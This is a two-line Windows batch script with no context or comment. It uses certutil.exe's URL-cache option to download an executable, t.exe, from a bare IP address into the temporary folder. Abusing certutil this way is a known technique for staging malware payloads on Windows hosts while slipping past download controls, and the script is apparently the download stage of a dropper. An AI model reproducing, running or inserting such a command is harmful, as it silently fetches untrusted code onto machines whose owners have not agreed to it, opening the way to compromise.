@echo off
certutil.exe -urlcache -split -f http://198.51.100.7/t.exe %TEMP%\t.exe
